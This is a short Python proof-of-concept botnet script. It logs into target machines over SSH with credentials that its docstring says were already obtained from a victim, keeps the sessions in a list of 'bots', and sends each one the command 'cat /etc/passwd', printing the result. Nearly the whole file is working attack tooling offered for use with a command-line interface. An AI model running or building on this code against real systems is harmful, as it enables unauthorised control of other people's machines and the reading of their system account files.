#!/usr/bin/env python3

'''
This is a POC of a very simple botnet, where after acquiring a target's credentials
the attacker connects through SSH and executes the command 'cat /etc/passwd' on the target's system.
Usage: python3 botnet.py -i <ipaddress> -u <username> -p <password>
'''

from pexpect import pxssh
import argparse

class Bot: # template for each bot we add to the botnet

    # initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()

    # secure shell into client/host
    def ssh(self):
        try:
            bot = pxssh.pxssh() # allows to connect to the host
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print("Connection Failure.")
            print(e)

    # send command to client
    def send_command(self, cmd): # connect to the terminal and send command
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

# send a command to all bots in the botnet
def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command) # inputs coomand ('cat /etc/passwd')
        print(f"Output from {bot.host}") # prints host
        print(attack) # prints command output

# list of bots in botnet
botnet = []

# add a new bot to the botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

# get commandline arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest='host', help='type hostname or ip')
    parser.add_argument("-u", dest='user', help='type username')
    parser.add_argument("-p", dest='passwd', help='type password')
    options = parser.parse_args()
    host = options.host
    user = options.user
    password = options.passwd
    if host == None or user == None or password == None:
        parser.print_help()
        exit(0)
    add_bot(host, user, password)

get_arguments()
# displays content of passwd file
command_bots('cat /etc/passwd')
